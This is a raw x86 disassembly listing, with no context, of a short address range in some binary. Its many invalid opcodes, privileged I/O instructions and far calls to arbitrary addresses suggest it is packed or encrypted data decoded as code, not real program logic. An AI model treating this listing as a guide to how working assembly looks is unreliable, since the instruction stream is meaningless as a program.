  420c4a:	shr    BYTE PTR [edi],0xed
  420c4d:	mov    bl,0xc3
  420c4f:	retf   
  420c50:	fistp  QWORD PTR [ecx-0x21]
  420c53:	loope  0x420c60
  420c55:	stos   DWORD PTR es:[edi],eax
  420c56:	repnz xchg ecx,eax
  420c58:	js     0x420c31
  420c5a:	mov    ch,BYTE PTR [edi-0x79f48da4]
  420c60:	int    0xc0
  420c62:	sbb    BYTE PTR [edx+0x6c2cb44a],ch
  420c68:	cmp    eax,0x3b354fd9
  420c6d:	jle    0x420c3a
  420c6f:	fwait
  420c70:	aaa    
  420c71:	idiv   DWORD PTR [edi-0x772317c1]
  420c77:	mov    bh,0x58
  420c79:	int    0x6b
  420c7b:	sbb    eax,0xe6b08ca9
  420c80:	mov    eax,ds:0x35425bcb
  420c85:	mov    al,0xeb
  420c87:	pushf  
  420c88:	jbe    0x420ce2
  420c8a:	sbb    eax,0x6ba524a1
  420c8f:	mov    esp,0x3a18ca7d
  420c94:	stc    
  420c95:	jnp    0x420c9f
  420c97:	test   esp,edx
  420c99:	jecxz  0x420c7a
  420c9b:	outs   dx,DWORD PTR ds:[esi]
  420c9c:	outs   dx,DWORD PTR ds:[esi]
  420c9d:	push   ecx
  420c9e:	mov    edx,0x1395010c
  420ca3:	rcl    DWORD PTR [edi],1
  420ca5:	cdq    
  420ca6:	icebp  
  420ca7:	and    al,0xfd
  420ca9:	sub    bl,dl
  420cab:	adc    al,0x9c
  420cad:	(bad)  
  420cae:	not    DWORD PTR [esi+0x1a]
  420cb1:	jmp    0x1af727d6
  420cb6:	pop    ecx
  420cb7:	fsubrp st(0),st
  420cb9:	pop    eax
  420cba:	outs   dx,DWORD PTR ds:[esi]
  420cbb:	add    al,0xd0
  420cbd:	loope  0x420d30
  420cbf:	ins    DWORD PTR es:[edi],dx
  420cc0:	aaa    
  420cc1:	jmp    0x420ce5
  420cc3:	cmp    dl,al
  420cc5:	jno    0x420d11
  420cc7:	sar    BYTE PTR [esi+0xaf4f111],1
  420ccd:	es cmp al,0x87
  420cd0:	cwde   
  420cd1:	(bad)  
  420cd2:	adc    esi,DWORD PTR [edx+0x30]
  420cd5:	sub    esp,eax
  420cd7:	xchg   ebp,eax
  420cd8:	leave  
  420cd9:	xchg   esp,eax
  420cda:	je     0x420d59
  420cdc:	adc    ch,ch
  420cde:	js     0x420cc9
  420ce0:	mov    eax,0x6f215546
  420ce5:	cmp    DWORD PTR [esi],edx
  420ce7:	fs lahf 
  420ce9:	loope  0x420d02
  420ceb:	idiv   DWORD PTR [eax]
  420ced:	jns    0x420ce9
  420cef:	and    ecx,eax
  420cf1:	mul    esi
  420cf3:	call   0x706a49d1
  420cf8:	clc    
  420cf9:	call   0x8192:0xe83b37ed
  420d00:	arpl   WORD PTR [ebx+0x52],cx
  420d03:	sar    DWORD PTR [edi-0xc],0x41
  420d07:	mov    ?,edx
  420d09:	push   edx
  420d0a:	in     al,dx
  420d0b:	mov    ecx,0xfb68a4c2
  420d10:	sub    eax,0xc7486471
  420d15:	jo     0x420d0d
  420d17:	les    ebx,FWORD PTR [ecx]
  420d19:	enter  0x48fb,0x2f
  420d1d:	shl    BYTE PTR [eax-0x3662c2fb],0xd9
  420d24:	repnz das 
  420d26:	clc    
  420d27:	(bad)  
  420d28:	stos   BYTE PTR es:[edi],al
  420d29:	dec    ecx
  420d2a:	imul   eax,DWORD PTR [edi-0x6e],0xb628c042
  420d31:	in     al,0xa0
  420d33:	push   esi
  420d34:	ss hlt 
  420d36:	inc    ebp
  420d37:	addr16 rcl ebp,cl
  420d3a:	mov    gs,WORD PTR [edx+0x32af5090]
  420d40:	mov    ebp,DWORD PTR [ecx+0x40]
  420d43:	jl     0x420da5
  420d45:	and    DWORD PTR [ecx-0x46],ecx
  420d48:	xchg   esp,eax
  420d49:	(bad)  
  420d4a:	dec    esp
  420d4b:	ins    BYTE PTR es:[edi],dx
  420d4c:	xchg   ecx,eax
  420d4d:	(bad)  
  420d4e:	daa    
  420d4f:	loope  0x420d1c
  420d51:	jmp    0xc96f:0xbb760933
  420d58:	lods   al,BYTE PTR ds:[esi]
  420d59:	pop    ecx
  420d5a:	pop    esi
  420d5b:	(bad)  
  420d5c:	adc    bl,BYTE PTR [ebx]
  420d5e:	push   ds
  420d5f:	adc    DWORD PTR [edx+0x21],esi
  420d62:	push   edi
  420d63:	test   BYTE PTR [esi+0x7f217ac0],ch
  420d69:	mov    bl,0xa8
  420d6b:	xor    BYTE PTR [ebx+0x30],bl
  420d6e:	cdq    
  420d6f:	push   esi
  420d70:	popa   
  420d71:	sti    
  420d72:	mov    edx,0x67205e52
  420d77:	add    eax,0xab929491
  420d7c:	mov    es,esi
  420d7e:	jge    0x420d1d
  420d80:	lahf   
  420d81:	sbb    eax,0xdb51f8ec
  420d86:	push   edi
  420d87:	cmp    dh,BYTE PTR [ecx-0x20d08513]
  420d8d:	sahf   
  420d8e:	lds    edx,FWORD PTR [ecx+0x7f]
  420d91:	pushf  
  420d92:	inc    edx
  420d93:	mov    ecx,0x68784af9
  420d98:	cld    
  420d99:	jg     0x420dbe
  420d9b:	adc    ecx,ebx
  420d9d:	gs inc edx
  420d9f:	push   ebx
  420da0:	dec    esi
  420da1:	cmp    eax,edi
  420da3:	xchg   edx,eax
  420da4:	sbb    al,0x9a
  420da6:	dec    esi
  420da7:	and    al,BYTE PTR [edi-0x66]
  420daa:	add    BYTE PTR [edx-0x37],dl
  420dad:	push   ds
  420dae:	(bad)  
  420db0:	lea    ecx,[eax-0x62b3080]
  420db6:	mov    BYTE PTR [edx-0x63],0xf9
  420dba:	push   edi
  420dbb:	xchg   DWORD PTR [ebx-0x59],esp
  420dbe:	or     eax,0x12d86c6b
  420dc3:	jge    0x420dae
  420dc5:	pop    ds
  420dc6:	jmp    0x420d8b
  420dc8:	cli    
  420dc9:	mov    ds:0xab64b6ae,eax
  420dce:	mov    al,ds:0xc0ec8ae2
  420dd3:	dec    ecx
  420dd4:	mov    ds:0x3d0af9bd,eax
  420dd9:	icebp  
  420dda:	iret   
  420ddb:	xchg   esp,eax
  420ddc:	add    ch,BYTE PTR [ebx+0x7e9c4202]
  420de2:	(bad)  
  420de3:	jle    0x420d72
  420de5:	js     0x420e5b
  420de7:	js     0x420df9
  420de9:	mov    ch,0x7f
  420deb:	repnz adc DWORD PTR [ebx+0x5e],0x8dc55df2
  420df3:	push   0x49
  420df5:	or     al,0xf4
  420df7:	mov    ebx,0x1504dd9c
  420dfc:	push   0xffffff9f
  420dfe:	dec    ebx
  420dff:	(bad)  
  420e00:	pop    edx
  420e01:	jne    0x420e3c
  420e03:	outs   dx,DWORD PTR ds:[esi]
  420e04:	or     al,0xf9
  420e06:	inc    esp
  420e07:	jo     0x420dc7
  420e09:	adc    ebp,ecx
  420e0b:	jne    0x420e24
  420e0d:	push   ebp
  420e0e:	dec    esp
  420e0f:	outs   dx,BYTE PTR ds:[esi]
  420e10:	and    al,0x26
  420e12:	xor    edx,edx
  420e14:	ds pop edi
  420e16:	in     al,dx
  420e17:	(bad)  
  420e18:	std    
  420e19:	es dec edx
  420e1b:	lods   eax,DWORD PTR ds:[esi]
  420e1c:	ret    0xf898
  420e1f:	test   BYTE PTR [ebx-0x38],dh
  420e22:	dec    eax
  420e23:	lods   al,BYTE PTR ds:[esi]
  420e24:	bnd jnp 0x420e85
  420e27:	jecxz  0x420e75
  420e29:	inc    edi
  420e2a:	push   0x24
  420e2c:	js     0x420e12
  420e2e:	rcl    ah,0x41
  420e31:	adc    al,0x80
  420e33:	xor    al,0x6f
  420e35:	aas    
  420e36:	or     BYTE PTR [ecx+0x7e74b9a0],0xde
  420e3d:	adc    al,0xcd
  420e3f:	mov    bh,0xa8
  420e41:	popf   
  420e42:	icebp  
  420e43:	dec    edi
  420e44:	fxch   st(6)
  420e46:	cs pusha 
  420e48:	jnp    0x420ebb
  420e4a:	hlt    
  420e4b:	ror    DWORD PTR [ebx],cl
  420e4d:	and    ch,BYTE PTR [ecx-0x29b28ce0]
  420e53:	ret    
  420e54:	lods   eax,DWORD PTR ds:[esi]
  420e55:	add    dh,dl
  420e57:	bnd js 0x420e5f
  420e5a:	mov    edx,DWORD PTR [ebp+edi*4-0x71]
  420e5e:	sbb    dl,cl
  420e60:	xchg   esp,eax
  420e61:	lock or BYTE PTR [eax-0xe9197ad],ch
  420e68:	imul   edi,DWORD PTR [ebx+0x445722a6],0xffffffd8
  420e6f:	dec    ecx
  420e70:	mov    DWORD PTR [esi+eiz*4-0x75],edx
  420e74:	fld    QWORD PTR [ecx-0x7e3132c7]
  420e7a:	or     eax,edx
  420e7c:	test   DWORD PTR [eax+ebx*2+0x64],edx
  420e80:	mov    esp,esi
  420e82:	mov    dl,0xfa
  420e84:	stc    
  420e85:	jb     0x420e6c
  420e87:	jbe    0x420e11
  420e89:	lods   al,BYTE PTR ds:[esi]
  420e8a:	and    edi,DWORD PTR [ecx-0xf]
  420e8d:	sbb    esi,DWORD PTR ds:0xa6b15305
  420e93:	inc    edx
  420e94:	aaa    
  420e95:	(bad)  
  420e96:	pop    esp
  420e97:	sub    al,0xaf
  420e99:	pop    edi
  420e9a:	mov    BYTE PTR [eax],bl
  420e9c:	inc    edx
  420e9d:	xchg   ebp,eax
  420e9e:	pop    ebx
  420e9f:	adc    BYTE PTR [ecx],bl
  420ea1:	push   eax
  420ea2:	das    
  420ea3:	push   0x47edba25
  420ea8:	add    DWORD PTR [ebp+0x133df150],ebx
  420eae:	aam    0xb2
  420eb0:	xchg   ebx,eax
  420eb1:	xlat   BYTE PTR ds:[ebx]
  420eb2:	out    0x1b,eax
  420eb4:	dec    ebx
  420eb5:	dec    ecx
  420eb6:	lahf   
  420eb7:	shl    ecx,0xf4
  420eba:	leave  
  420ebb:	and    DWORD PTR [edi+0x52b6476b],0xffffff83
  420ec2:	rcr    BYTE PTR [ebp-0x72],1
  420ec5:	lods   eax,DWORD PTR ds:[esi]
  420ec6:	jp     0x420f28
  420ec8:	rol    DWORD PTR [esi],1
  420eca:	aam    0x4b
  420ecc:	ja     0x420ea4
  420ece:	mov    bl,BYTE PTR [esi-0x21]
  420ed1:	das    
  420ed2:	test   BYTE PTR [ebp+ecx*4+0x69bc0c67],0x9b
  420eda:	inc    edx
  420edb:	cwde   
  420edc:	rcr    cl,cl
  420ede:	mov    al,ds:0x99237036
  420ee3:	inc    esi
  420ee4:	ficom  DWORD PTR [ebp-0x8419cac]
  420eea:	jp     0x420f6a
  420eec:	cmp    DWORD PTR [edi-0x584447ab],edi
  420ef2:	fucom  st(4)
  420ef4:	inc    ecx
  420ef5:	rcl    edx,cl
  420ef7:	cld    
  420ef8:	rol    DWORD PTR [ebx-0x65d352],0xb2
  420eff:	mov    ebp,0xd58663c4
  420f04:	and    BYTE PTR [ecx+ecx*1+0xf],cl
  420f08:	in     al,dx
  420f09:	and    ah,dh
  420f0b:	jmp    0x420eb7
  420f0d:	push   edi
  420f0e:	push   di
  420f10:	sub    dh,BYTE PTR [ecx+0xa2a7206]
  420f16:	hlt    
  420f17:	cmp    BYTE PTR [edx],al
  420f19:	fisubr DWORD PTR [ebx+0x3d23c74b]
  420f1f:	xlat   BYTE PTR ds:[ebx]
  420f20:	xor    BYTE PTR [edx],al
  420f22:	out    0x78,al
  420f24:	(bad)  
  420f25:	fist   DWORD PTR [ebx]
  420f27:	mov    ebp,0xd633e7a
  420f2c:	jbe    0x420f55
  420f2e:	cmp    BYTE PTR [ecx+0xf01afca],cl
  420f34:	and    al,0xcd
  420f36:	push   cs
  420f37:	sub    DWORD PTR [ecx+0xf783ebf],edx
  420f3d:	xchg   ecx,eax
  420f3e:	(bad)  
  420f40:	add    eax,0x457f1ee3
  420f45:	and    eax,0x393c236
  420f4a:	daa    
  420f4b:	ins    DWORD PTR es:[edi],dx
  420f4c:	dec    esi
  420f4d:	jmp    0x420f17
  420f4f:	mov    ds:0xfdd19b1e,al
  420f54:	mov    al,BYTE PTR [ecx+0x35a45ea9]
  420f5a:	stos   BYTE PTR es:[edi],al
  420f5b:	in     al,dx
  420f5c:	sub    dh,BYTE PTR [ecx+esi*8]
  420f5f:	jle    0x420fad
  420f61:	xchg   esp,eax
  420f62:	xor    al,0xc2
  420f64:	xchg   esi,eax
  420f65:	mov    ch,BYTE PTR [esi-0x483163c1]
  420f6b:	leave  
  420f6c:	adc    DWORD PTR [eax],edi
  420f6e:	ja     0x420fd0
  420f70:	dec    ecx
  420f71:	pop    eax
  420f72:	jge    0x420f27
  420f74:	add    eax,0x1a9faccf
  420f79:	cs dec edi
  420f7b:	jmp    0xa42b13aa
  420f80:	xor    al,0x9e
  420f82:	loop   0x420f96
  420f84:	add    ebp,DWORD PTR [ecx-0x2d9e3dbb]
  420f8a:	push   cs
  420f8b:	into   
  420f8c:	bnd jnp 0x420f48
  420f8f:	xor    BYTE PTR cs:0x8daf6b60,al
  420f96:	add    al,0x55
  420f98:	(bad)  
  420f99:	inc    ebx
  420f9a:	in     al,0x1d
  420f9c:	test   DWORD PTR [eax+0x2a],eax
  420f9f:	outs   dx,DWORD PTR ds:[esi]
  420fa0:	pushf  
  420fa1:	fld    TBYTE PTR [ebx-0x4c0c253b]
  420fa7:	or     esi,DWORD PTR [ebx]
  420fa9:	loopne 0x420f39
  420fab:	sbb    BYTE PTR [edx+0x52f8e4ae],bl
  420fb1:	sbb    BYTE PTR [ebp+0x38e40498],0x59
  420fb8:	xor    eax,0x96bf383c
  420fbd:	in     eax,0x6a
  420fbf:	pop    ss
  420fc0:	push   ecx
  420fc1:	rcl    ecx,1
  420fc3:	xor    dh,BYTE PTR [edx+0xd]
  420fc6:	cmp    BYTE PTR [esi],bh
  420fc8:	out    0x4c,al
  420fca:	sbb    dl,BYTE PTR [eax+edx*2]
  420fcd:	popf   
  420fce:	push   es
  420fcf:	dec    ecx
  420fd0:	in     eax,0x16
  420fd2:	js     0x42100e
  420fd4:	push   esi
  420fd5:	xchg   ebx,eax
  420fd6:	loopne 0x421003
  420fd8:	jmp    0x1fe2:0xcf8bde7
  420fdf:	and    al,0xb
  420fe1:	mov    DWORD PTR [ebp-0x69],esp
  420fe4:	cmp    eax,DWORD PTR [ebx+0x7091ab76]
  420fea:	loop   0x420fea
  420fec:	loopne 0x421036
  420fee:	jl     0x420fd3
  420ff0:	xchg   DWORD PTR [edx-0x74de296e],edx
  420ff6:	pop    edx
  420ff7:	stos   BYTE PTR es:[edi],al
  420ff8:	addr16 inc edx
  420ffa:	jp     0x42104b
  420ffc:	dec    ebx
  420ffd:	bound  esi,QWORD PTR [edi]
  420fff:	cmc    
  421000:	loope  0x420fad
  421002:	into   
  421003:	push   ebx
  421004:	cld    
  421005:	jae    0x421071
  421007:	repz fwait
  421009:	mov    WORD PTR [ebp-0x205bb33a],cs
  42100f:	add    BYTE PTR [edx+0x66],0x4d
  421013:	fisubr WORD PTR [ebp-0x2e0d66b]
  421019:	sub    ecx,DWORD PTR [esi]
  42101b:	xor    dh,BYTE PTR [esi-0x5be95fab]
  421021:	mov    al,0xf7
  421023:	mov    eax,0xb0568f3e
  421028:	sbb    eax,edi
  42102a:	mov    al,0x54
  42102c:	in     al,dx
  42102d:	loop   0x420fc1
  42102f:	pop    esi
  421030:	mov    edx,0x988a9409
  421035:	mov    cl,0xb6
  421037:	call   0x1a6:0xa3472d8b
  42103e:	or     esi,0x5c3f768
  421044:	mov    esi,0xc9cfe83
  421049:	pop    edi
  42104a:	call   0xe724b9ff
  42104f:	stc    
  421050:	push   ecx
  421051:	call   0x91407a0d
  421056:	retf   
  421057:	or     DWORD PTR [edx],ecx
  421059:	push   es
  42105a:	fwait
  42105b:	add    eax,DWORD PTR [esp+eax*8+0x507fa48f]
  421062:	addr16 test eax,0x631015a2
  421068:	rcr    DWORD PTR ds:0x58ee410b,cl
  42106e:	and    DWORD PTR [eax-0x1c],edx
  421071:	clc    
  421072:	repz xchg esi,eax
  421074:	nop
  421075:	adc    BYTE PTR ds:0x6ea96cd0,bh
  42107b:	xchg   ebx,eax
  42107c:	adc    edx,esp
  42107e:	dec    edi
  42107f:	adc    bh,dh
  421081:	jg     0x421077
  421083:	add    eax,0x4eea46ac
  421088:	(bad)  
  421089:	xchg   ebx,eax
  42108a:	xor    DWORD PTR [ecx-0x7c8ece3b],edx
  421090:	push   edx
  421091:	xchg   edi,eax
  421092:	repnz shl BYTE PTR [esi+0x73fd38aa],cl
  421099:	lock test eax,0x92ddb157
  42109f:	cdq    
  4210a0:	cmp    ah,BYTE PTR [esi]
  4210a2:	leave  
  4210a3:	sbb    DWORD PTR [esi],eax
  4210a5:	mov    BYTE PTR [edi],0x37
  4210a8:	inc    edx
  4210a9:	cmp    eax,0x2e24eae6
  4210ae:	sbb    eax,0x782b9faa
  4210b3:	bnd jo 0xe852dbe8
  4210ba:	call   0xc981:0x75158a89
  4210c1:	pop    edx
  4210c2:	loop   0x421121
  4210c4:	sahf   
  4210c5:	mov    bh,0x4c
  4210c7:	loope  0x421096
  4210c9:	call   FWORD PTR [esi+ecx*4]
  4210cc:	push   eax
  4210cd:	jns    0x4210b3
  4210cf:	imul   edi
  4210d1:	inc    ebp
  4210d2:	mov    ebx,0x440c14b1
  4210d7:	iret   
  4210d8:	and    al,0x48
  4210da:	outs   dx,DWORD PTR ds:[esi]
  4210db:	mov    ds:0x1e800207,eax
  4210e0:	push   ebx
  4210e1:	daa    
  4210e2:	dec    edx
  4210e3:	mov    WORD PTR [eax],?
  4210e5:	in     eax,dx
  4210e6:	repz xchg ecx,eax
  4210e8:	add    eax,esi
  4210ea:	xchg   esp,eax
  4210eb:	and    edi,DWORD PTR [eax+0x61]
  4210ee:	stc    
  4210ef:	inc    esp
  4210f0:	or     eax,0x32ae1ee4
  4210f5:	cdq    
  4210f6:	retf   0xfa40
  4210f9:	dec    ebp
  4210fa:	jns    0x4210ab
  4210fc:	adc    esp,DWORD PTR ds:0xe90e42e8
  421102:	xchg   esi,eax
  421103:	std    
  421104:	push   0x26
  421106:	add    al,0xbc
  421108:	sar    DWORD PTR [ebx+edi*8-0x11],0x37
  42110d:	repz add al,0x33
  421110:	in     eax,0x77
  421112:	mov    ecx,0xa16ec2a5
  421117:	jle    0x42115f
  421119:	adc    bh,BYTE PTR [ebx+eax*8-0x65]
  42111d:	pop    ss
  42111e:	es add bh,bh
  421121:	loope  0x42118e
  421123:	mov    ebx,0x7cd7253
  421128:	pop    edx
  421129:	inc    ebx
  42112a:	and    ah,BYTE PTR [edi+0x25]
  42112d:	mov    eax,ds:0xeae7f70c
  421132:	mov    WORD PTR [eax+0x78],ds
  421135:	bound  edi,QWORD PTR [esi]
  421137:	mov    al,ds:0x58ab1fb5
  42113c:	iret   
  42113d:	mov    ss,WORD PTR [edx+ebx*8+0x181c470]
  421144:	sahf   
  421145:	es jle 0x4210e0
  421148:	xabort 0x2a
  42114b:	or     BYTE PTR [ebx],ah
  42114d:	inc    ecx
  42114e:	retf   0x216c
  421151:	or     DWORD PTR [ebp-0x6d],0xaa8cb384
  421158:	ror    DWORD PTR [ebx+0x5cd817de],0x5e
  42115f:	ror    DWORD PTR [ecx+0x4bdd4e5a],0x27
  421166:	inc    edi
  421167:	scas   al,BYTE PTR es:[edi]
  421168:	neg    BYTE PTR [eax+0x59]
  42116b:	xlat   BYTE PTR ds:[ebx]
  42116c:	jbe    0x421190
  42116e:	dec    edi
  42116f:	dec    esi
  421170:	cwde   
  421171:	push   ss
  421172:	or     ebx,0x5149fccd
  421178:	or     esp,0xffffffab
  42117b:	cli    
  42117c:	xor    BYTE PTR [ebx-0x7507b54],dl
  421182:	imul   edi,DWORD PTR [edx],0x3293bf5a
  421188:	fwait
  421189:	cmc    
  42118a:	cdq    
  42118b:	push   ss
  42118c:	inc    ecx
  42118d:	pop    ebx
  42118e:	fsub   st,st(2)
  421190:	or     DWORD PTR [ebx+0x4f],ecx
  421193:	mov    es,WORD PTR [esi+0x7b07dd4]
  421199:	dec    ebp
  42119a:	fwait
  42119b:	inc    ebx
  42119c:	mov    ebx,0x60a7463a
  4211a1:	sub    esi,eax
  4211a3:	pop    edi
  4211a4:	sub    eax,0xabbfecf8
  4211a9:	xchg   edx,eax
  4211aa:	js     0x42117a
  4211ac:	sub    al,0xae
  4211ae:	and    BYTE PTR [eax+0x350b21ae],dh
  4211b4:	pop    ebx
  4211b5:	inc    edx
  4211b6:	fdivr  DWORD PTR [edi-0x4b]
  4211b9:	ins    BYTE PTR es:[edi],dx
  4211ba:	out    dx,al
  4211bb:	dec    esi
  4211bc:	fnstenv [eax+0x1e6436]
  4211c2:	fidiv  WORD PTR [esi+eiz*2]
  4211c5:	xor    ah,dh
  4211c7:	aaa    
  4211c8:	ins    DWORD PTR es:[edi],dx
  4211c9:	jo     0x4211f5
  4211cb:	and    dh,bh
  4211cd:	fisttp QWORD PTR [edi]
  4211cf:	sbb    al,0xe
  4211d1:	add    eax,0x6c
  4211d4:	sub    al,0xaf
  4211d6:	push   eax
  4211d7:	in     eax,0xa1
  4211d9:	loope  0x421160
  4211db:	xor    eax,0x846c3fd0
  4211e0:	imul   ebx,ecx,0xf2bfce69
  4211e6:	repz push ebx
  4211e8:	aam    0x7b
  4211ea:	mov    BYTE PTR [ebx-0x16],al
  4211ed:	or     edi,DWORD PTR [ebx]
  4211ef:	imul   dx,WORD PTR [esi+0x201fc72b],0x50
  4211f7:	lods   al,BYTE PTR ds:[esi]
  4211f8:	mov    ch,0xaf
  4211fa:	mov    dl,0x9
  4211fc:	sbb    BYTE PTR [esi+0x122761a2],dh
  421202:	push   ds
  421203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421204:	cwde   
  421205:	inc    eax
  421206:	dec    ebx
  421207:	add    BYTE PTR [esi+0x34e93604],cl
  42120d:	repnz (bad) 
  42120f:	outs   dx,DWORD PTR ds:[esi]
  421210:	xor    edi,0x61
  421213:	sub    ebx,esp
  421215:	sub    DWORD PTR [eax+0x4f65c2bb],esp
  42121b:	ds push ecx
  42121d:	sbb    esp,esi
  42121f:	xor    al,0x52
  421221:	and    BYTE PTR ds:[eax-0x66f7b431],cl
  421228:	sub    cl,dl
  42122a:	xor    al,0xc4
  42122c:	pop    eax
  42122d:	sub    dl,ah
  42122f:	mov    WORD PTR [edi],ds
  421231:	mov    WORD PTR [ebx-0xd7bf39e],?
  421237:	xlat   BYTE PTR ds:[ebx]
  421238:	lahf   
  421239:	inc    ecx
  42123a:	mov    esi,0xe862265f
  42123f:	into   
  421240:	xor    BYTE PTR [edx+edi*2],bl
  421243:	xchg   al,ch
  421245:	(bad)  
  421247:	fsubr  st(3),st
  421249:	pop    esi
  42124a:	sub    edi,DWORD PTR [edi+0x657142ed]
  421250:	retf   
  421251:	or     cl,BYTE PTR [ecx+0x79]
  421254:	push   esp
  421255:	sbb    al,0x61
  421257:	aam    0xea
  421259:	mov    edx,DWORD PTR [eax-0x35]
  42125c:	call   0x86b55c1b
  421261:	mov    dl,0x88
  421263:	sub    ah,BYTE PTR [esi]
  421265:	mov    al,0xcb
  421267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421268:	popa   
  421269:	imul   esi,DWORD PTR [edi+0x3b6bd31b],0xb75f0fff
  421273:	cmc    
  421274:	pop    eax
  421275:	mov    eax,ds:0xdd6dd4e6
  42127a:	fistp  QWORD PTR [ebp+0x57d80b82]
  421280:	sub    al,0xf4
  421282:	aas    
  421283:	push   esi
  421284:	adc    bl,dl
  421286:	ret    0x106b
  421289:	dec    esp
  42128a:	dec    ebx
  42128b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42128c:	add    ch,BYTE PTR [eax*2-0x62a8b8be]
  421293:	mov    cl,0x3b
  421295:	das    
  421296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421297:	xchg   edi,eax
  421298:	sbb    dh,bl
  42129a:	cli    
  42129b:	xchg   esi,eax
  42129c:	lods   eax,DWORD PTR ds:[esi]
  42129d:	pop    esi
  42129e:	sub    eax,0x4d3d85b3
  4212a3:	(bad)  
  4212a4:	cli    
  4212a5:	mov    ?,WORD PTR [edx+0x3202aa4f]
  4212ab:	push   eax
  4212ac:	mov    dh,0x3d
  4212ae:	addr16 sbb dh,ch
  4212b1:	pop    eax
  4212b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212b3:	jnp    0x4212dc
  4212b5:	lock pop ebp
  4212b7:	and    ch,BYTE PTR [edi-0x2e769d08]
  4212bd:	push   esp
  4212be:	cmp    dl,BYTE PTR [ecx]
  4212c0:	dec    esp
  4212c1:	imul   edx,edx,0x346aed0e
  4212c7:	ins    BYTE PTR es:[edi],dx
  4212c8:	addr16 inc edi
  4212ca:	xor    DWORD PTR [edx+0x22],ecx
  4212cd:	fcmovnb st,st(2)
  4212cf:	fmul   QWORD PTR [ebx-0x1]
  4212d2:	das    
  4212d3:	xchg   BYTE PTR [ebx+0x54c01f37],dh
  4212d9:	retf   0x259b
  4212dc:	aas    
  4212dd:	aas    
  4212de:	dec    esp
  4212df:	mov    eax,ds:0x38fab484
  4212e4:	fadd   st(5),st
  4212e6:	and    ah,BYTE PTR [esi-0x3e]
  4212e9:	fldenv [edx]
  4212eb:	icebp  
  4212ec:	addr16 mov ds:0x2a04,eax
  4212f0:	pop    esi
  4212f1:	sub    BYTE PTR [eax],al
  4212f3:	inc    esp
  4212f4:	cmpxchg bh,bh
  4212f7:	xor    edi,edi
  4212f9:	aas    
  4212fa:	pop    ebx
  4212fb:	adc    BYTE PTR [ebx+edi*4+0x5f],ch
  4212ff:	retf   0xca68
  421302:	cmp    bh,ah
  421304:	push   0xb4b42144
  421309:	inc    edi
  42130a:	imul   edx,DWORD PTR [edi-0x11024525],0x68
  421311:	addr16 xchg ecx,eax
  421313:	stos   DWORD PTR es:[edi],eax
  421314:	stc    
  421315:	xchg   edi,eax
  421316:	adc    eax,0xbf3661c
  42131b:	fmulp  st(2),st
  42131d:	hlt    
  42131e:	sub    bl,BYTE PTR [edi+0x7994c1b3]
  421324:	jle    0x421382
  421326:	test   al,0xb8
  421328:	sub    edi,0x2785e5b7
  42132e:	mov    bl,0x4f
  421330:	ror    esi,0xd3
  421333:	jle    0x421305
  421335:	xchg   ecx,eax
  421336:	(bad)  
  421337:	add    ebp,edx
  421339:	ret    0x6fcb
  42133c:	not    BYTE PTR [ebx]
  42133e:	push   edi
  42133f:	push   ebp
  421340:	fs fmul st,st(6)
  421343:	push   edx
  421344:	pop    eax
  421345:	fdiv   QWORD PTR [edi-0x7fc73a36]
  42134b:	aas    
  42134c:	int    0x95
  42134e:	cmp    BYTE PTR [ecx-0x69e77ae6],bh
  421354:	mov    esp,0xe2e56bef
  421359:	and    DWORD PTR [eax+0x21],0x53
  42135d:	inc    ecx
  42135e:	and    BYTE PTR [eax-0x6de8180c],ah
  421364:	push   eax
  421365:	push   ds
  421366:	sbb    al,ah
  421368:	repnz xchg esp,eax
  42136a:	xchg   DWORD PTR [eax],ecx
  42136c:	pop    ebp
  42136d:	push   edi
  42136e:	adc    BYTE PTR [ebx],bh
  421370:	enter  0x1eb1,0x7e
  421374:	in     al,dx
  421375:	sub    bh,BYTE PTR [edx]
  421377:	std    
  421378:	imul   DWORD PTR [ebx-0x1f]
  42137b:	mov    DWORD PTR [edi+0x1d],ebx
  42137e:	nop
  42137f:	mov    ebp,0x921a3669
  421384:	int3   
  421385:	aas    
  421386:	or     edx,DWORD PTR [edx]
  421388:	mov    esp,0xe30c6717
  42138d:	outs   dx,BYTE PTR ds:[esi]
  42138e:	cmc    
  42138f:	cmp    al,0xe6
  421391:	mov    esi,0xc60422cd
  421396:	and    edx,DWORD PTR ds:0x19f4a087
  42139c:	xlat   BYTE PTR ds:[ebx]
  42139d:	mov    esi,0x7aa78ed
  4213a2:	xor    esi,DWORD PTR [esi+ebp*1+0x12a00073]
  4213a9:	adc    eax,0xd994d20d
  4213ae:	mov    eax,0xc6d6ce67
  4213b3:	sbb    al,0x9c
  4213b5:	shr    DWORD PTR [ecx],cl
  4213b7:	xor    eax,0x25c19bcd
  4213bc:	or     ch,BYTE PTR ds:[edi+eiz*8+0x22]
  4213c1:	pop    esp
  4213c2:	mov    ebp,0xf1a0d823
  4213c7:	push   edi
  4213c8:	dec    edx
  4213c9:	jge    0x4213c6
  4213cb:	push   ds
  4213cc:	ins    DWORD PTR es:[edi],dx
  4213cd:	sbb    eax,0xfcd8b298
  4213d2:	out    0x60,al
  4213d4:	loope  0x421376
  4213d6:	mov    DWORD PTR [eax+0x46],esi
  4213d9:	lahf   
  4213da:	or     eax,0x63c68abc
  4213df:	mov    ebp,0x76bff8f
  4213e4:	push   ebx
  4213e5:	sub    bh,BYTE PTR ds:0xc16088f4
  4213eb:	(bad)  
  4213ec:	out    dx,eax
  4213ed:	hlt    
  4213ee:	mov    ebp,0x9219fcf2
  4213f3:	xor    bl,al
  4213f5:	or     eax,0x53e064d5
  4213fa:	rcr    DWORD PTR [edi],1
  4213fc:	pusha  
  4213fd:	sub    eax,0xde2ab75e
  421402:	dec    eax
  421403:	pop    ebp
  421404:	inc    ecx
  421405:	in     al,dx
  421406:	call   0x8a062be0
  42140b:	aam    0xa6
  42140d:	pop    eax
  42140e:	push   esp
  42140f:	out    dx,al
  421410:	add    BYTE PTR [esi+0x4297c55a],bh
  421416:	cmc    
  421417:	xor    edi,DWORD PTR [ecx]
  421419:	(bad)  
  42141a:	outs   dx,DWORD PTR ds:[esi]
  42141b:	mov    bh,0x1a
  42141d:	or     dh,dh
  42141f:	xor    eax,0x890316c3
  421424:	int    0x9
  421426:	sub    bl,dl
  421428:	dec    esi
  421429:	je     0x42140e
  42142b:	cmp    al,0x3c
  42142d:	stc    
  42142e:	inc    edx
  42142f:	fwait
